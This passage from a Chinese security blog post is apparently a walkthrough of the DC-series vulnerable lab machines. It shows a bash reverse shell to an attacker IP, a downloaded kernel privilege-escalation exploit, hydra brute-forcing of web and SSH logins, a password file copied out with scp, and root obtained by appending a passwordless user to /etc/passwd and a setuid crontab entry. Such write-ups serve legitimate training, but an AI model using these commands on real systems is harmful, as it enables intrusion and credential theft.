+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">'sh -i &amp;&gt;/dev/tcp/192.168.126.33/4444 0&gt;&amp;1'</span>  <span class="comment">#反弹shell</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04</span></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Apport <span class="number">2.</span>x (Ubuntu Desktop <span class="number">12.10</span> &lt; <span class="number">16.04</span>) - Local Code Execution                           | exploits/linux/local/<span class="number">40937.</span>txt</span><br><span class="line">Exim <span class="number">4</span> (Debian <span class="number">8</span> / Ubuntu <span class="number">16.04</span>) - Spool Privilege Escalation                              | exploits/linux/local/<span class="number">40054.</span>c</span><br><span class="line">Google Chrome (Fedora <span class="number">25</span> / Ubuntu <span class="number">16.04</span>) - <span class="string">'tracker-extract'</span> / <span class="string">'gnome-video-thumbnailer'</span> + | exploits/linux/local/<span class="number">40943.</span>txt</span><br><span class="line">LightDM (Ubuntu <span class="number">16.04</span>/<span class="number">16.10</span>) - <span class="string">'Guest Account'</span> Local Privilege Escalation                  | exploits/linux/local/<span class="number">41923.</span>txt</span><br><span class="line">Linux Kernel (Debian <span class="number">7.7</span>/<span class="number">8.5</span>/<span class="number">9.0</span> / Ubuntu <span class="number">14.04</span><span class="number">.2</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">22</span>/<span class="number">25</span> / CentOS <span class="number">7.</span> | exploits/linux_x86<span class="number">-64</span>/local/<span class="number">42275.</span>c</span><br><span class="line">Linux Kernel (Debian <span class="number">9</span>/<span class="number">10</span> / Ubuntu <span class="number">14.04</span><span class="number">.5</span>/<span class="number">16.04</span><span class="number">.2</span>/<span class="number">17.04</span> / Fedora <span class="number">23</span>/<span class="number">24</span>/<span class="number">25</span>) - <span class="string">'ldso_dynami | exploits/linux_x86/local/42276.c</span></span><br><span class="line"><span class="string">Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps                      | exploits/linux/dos/39773.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR &amp; SMEP Bypass) Arbitrary File Read  | exploits/linux/local/45175.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>BPF<span class="string">' Local Privilege Escalation (Metasploit)            | exploits/linux/local/40759.rb</span></span><br><span class="line"><span class="string">Linux Kernel 4.4 (Ubuntu 16.04) - '</span>snd_timer_user_ccallback()<span class="string">' Kernel Pointer Leak         | exploits/linux/dos/46529.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition Privilege Esca | exploits/linux_x86-64/local/40871.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Privilege | exploits/linux_x86-64/local/40049.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x86-64) - '</span>AF_PACKET<span class="string">' Race Condition  | exploits/linux/local/47170.c</span></span><br><span class="line"><span class="string">Linux Kernel 4.4.x (Ubuntu 16.04) - '</span>double-fdput()<span class="string">' bpf(BPF_PROG_LOAD) Privilege Escalati | exploits/linux/local/39772.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.6.2 (Ubuntu 16.04.1) - '</span>IP6T_SO_SET_REPLACE<span class="string">' Local Privilege Escalation     | exploits/linux/local/40489.txt</span></span><br><span class="line"><span class="string">Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                                 | exploits/linux/dos/45919.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation              | exploits/linux/local/45010.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                     | exploits/linux/local/44298.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - '</span>netfilter target_offset<span class="string">' Local Privilege Esc | exploits/linux/local/44300.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KA | exploits/linux/local/43418.c</span></span><br><span class="line"><span class="string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Priv | exploits/linux/local/47169.c</span></span><br><span class="line"><span class="string">------------------------------------------------------------------------------------------- ----------------------------------------</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查看该exp的使用方法，先执行compile.sh、再执行doubleput即可</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/39772.txt ubuntu_v1604_shell.txt</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt </span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line"></span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line">starting writev</span><br><span class="line">woohoo, got pointer reuse</span><br><span class="line">writev returned successfully. <span class="keyword">if</span> this worked, you<span class="string">'ll have a root shell in &lt;=60 seconds.</span></span><br><span class="line"><span class="string">suid file detected, launching rootshell...</span></span><br><span class="line"><span class="string">we have root privs now...</span></span><br><span class="line"><span class="string">root@host:~/ebpf_mapfd_doubleput# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)</span></span><br></pre></td></tr></table></figure>
+
+<p>先下载到本地解压缩后，开启本地的web服务器，上传到目标服务器，由于文件过大，蚁剑无法上传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</span></span><br><span class="line">unzip <span class="number">39772.</span>zip</span><br><span class="line">cd <span class="number">39772</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> ...</span><br><span class="line">$ wget http://<span class="number">192.168</span><span class="number">.126</span><span class="number">.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput</span><br><span class="line">cat the-flag.txt</span><br><span class="line"> __        __   _ _   ____                   _ _ _ _ </span><br><span class="line"> \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |</span><br><span class="line">  \ \ /\ / / _ \ | | | | | |/ _ \| <span class="string">'_ \ / _ \ | | | |</span></span><br><span class="line"><span class="string">   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|</span></span><br><span class="line"><span class="string">    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)</span></span><br><span class="line"><span class="string">                                                     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations are in order.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you'</span>ve enjoyed this challenge <span class="keyword">as</span> I enjoyed making it.</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="DC-4渗透过程"><a href="#DC-4渗透过程" class="headerlink" title="DC-4渗透过程"></a><strong>DC-4渗透过程</strong></h2><p><strong>登陆页面，提示用admin登陆，这里用password.list密码本爆破，rockyou.txt需要很久时间，求出密码后登陆发现可以执行命令有回显，抓包修改反弹shell，发现了一个密码本，可能是用来爆破ssh账号的，用scp发送到本地</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/john<span class="comment"># hydra -l admin -P ./password.lst -f 192.168.126.149 http-post-form "/login.php:username=^USER^&amp;password=^PASS^:S=logout" -v</span></span><br><span class="line"></span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="type">VERBOSE</span>] Page redirected to http://<span class="number">192.168</span>.<span class="number">126.149</span>/index.php</span><br><span class="line">[<span class="number">80</span>][<span class="type">http</span>-<span class="type">post</span>-<span class="type">form</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: admin   password: happy</span><br><span class="line"></span><br><span class="line"><span class="comment">#将文件发送到本地</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># scp ./old-passwords.bak root@192.168.126.33:/root/tools</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#密码爆破，-t 64 表示线程数  -f 表示找到密码即停   -v表示显示具体的</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L users.txt -P pswd.txt ssh://192.168.126.149 -t 64 -f -v</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.149</span>   login: jim   password: jibril04</span><br><span class="line"></span><br><span class="line">root@kali:/usr/share/john<span class="comment"># ssh jim@192.168.126.149 </span></span><br><span class="line">jim@<span class="number">192.168</span>.<span class="number">126.149</span><span class="string">'s password: </span></span><br><span class="line"><span class="string">Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i68</span></span><br><span class="line"><span class="string">You have mail.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#发现邮件，查看邮件信息</span></span><br><span class="line"><span class="string">jim@dc-4:~$ cd /var/mail</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ ls</span></span><br><span class="line"><span class="string">jim  www-data</span></span><br><span class="line"><span class="string">jim@dc-4:/var/mail$ cat jim</span></span><br><span class="line"><span class="string">From charles@dc-4 Sat Apr 06 21:15:46 2019</span></span><br><span class="line"><span class="string">Return-path: &lt;charles@dc-4&gt;</span></span><br><span class="line"><span class="string">Hi Jim,</span></span><br><span class="line"><span class="string">I'</span>m heading off on holidays at the <span class="keyword">end</span> of today, so the boss asked me to give you my password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>
+
+<p><strong>信中给出了charles的密码，切换账户，查看是否有提权的途径，发现teehee命令可以执行root权限</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc<span class="literal">-4</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc<span class="literal">-4</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># teehee --help #查看teehee的用法</span></span><br><span class="line">Usage: teehee [<span class="type">OPTION</span>]... [<span class="type">FILE</span>]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  <span class="literal">-a</span>, -<span class="literal">-append</span>              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  <span class="literal">-i</span>, -<span class="literal">-ignore</span><span class="literal">-interrupts</span>   ignore interrupt signals</span><br><span class="line">  <span class="literal">-p</span>                        diagnose errors writing to non pipes</span><br><span class="line">      -<span class="literal">-output</span><span class="literal">-error</span>[=<span class="type">MODE</span>]   set behavior on write error.  See MODE below</span><br><span class="line">      -<span class="literal">-help</span>     display this help and <span class="keyword">exit</span></span><br><span class="line">      -<span class="literal">-version</span>  output version information and <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#teehee -a 表示写入文件，但是不会覆盖，所以可以通过写入一个root用户来执行root权限</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> echo <span class="string">"admin::0:0:admin::/bin/bash"</span>|sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">admin::<span class="number">0</span>:<span class="number">0</span>:admin::/bin/bash  <span class="comment">##[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> su admin</span><br><span class="line">root@dc<span class="literal">-4</span>:/home/charles<span class="comment"># cd /root</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> cat /etc/crontab</span></span><br><span class="line"><span class="string"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="string"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="string"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="string"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="string"># that none of the other crontabs do.</span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo  "</span>* * * * * root chmod <span class="number">4777</span> /bin/sh<span class="string">" | sudo teehee -a /etc/crontab</span></span><br><span class="line"><span class="string">#时间部分全部填写为*，默认这个定时任务每分钟执行一次</span></span><br><span class="line"><span class="string">#通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> /bin/sh</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls /root</span></span><br><span class="line"><span class="string">flag.txt</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+      
+      <!-- reward -->
+      
+      <div id="reward-btn">
+        打赏
+      </div>
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>版权声明： </strong s>
+              本博客所有文章除特别声明外，均采用 <a href="https://www.apache.org/licenses/LICENSE-2.0.html" rel="external nofollow"
+                target="_blank">Apache License 2.0</a> 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        Share
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://cumtchen.gitee.io/2020/08/28/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2020/09/11/Metasploit/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            Metasploit
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/07/11/oho/" class="article-nav-link">
+        <strong class="article-nav-caption">Older posts</strong>
+        <div class="article-nav-title">oho</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '6tKR3VfNf8sE102pp4QlkOSM-gzGzoHsz',
+        app_key: 'OVsjODdU2QixblMDCtzmEfYS',
+        path: window.location.pathname,
+        notify: '',
+        verify: 'false',
+        avatar: 'mp',
+        placeholder: '给我的文章加点建议吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul class="list-inline">
+      <li>
+        &copy;
+        2020
+        0Rld
+      </li>
+      <li>
+        
+          Powered by
+        
+        
+        <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul class="list-inline">
+      <li>
+        
+        
+        <span>
+  <i>PV:<span id="busuanzi_value_page_pv"></span></i>
+  <i>UV:<span id="busuanzi_value_site_uv"></span></i>
+</span>
+        
+      </li>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src=''></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+    <div class="to_top">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+      </div>
+    </main>
+      <aside class="sidebar">
+        <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/2020/about">About</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+      </aside>
+      <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+      
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<script src="/js/share.js"></script>
+
+
+
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
+    startDelay: 0,
+    typeSpeed: 200,
+    loop: true,
+    backSpeed: 100,
+    showCursor: true
+    });
+  } catch (err) {
+  }
+  
+</script>
+
+
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer:'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    onClick: (e) => {
+      $('.toc-link').removeClass('is-active-link');
+      $(`a[href=${e.target.hash}]`).addClass('is-active-link');
+      $(e.target.hash).scrollIntoView();
+      return false;
+    }
+  });
+</script>
+
+
+<script>
+  var ayerConfig = {
+    mathjax: true
+  }
+</script>
+
+
+<script src="/js/ayer.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
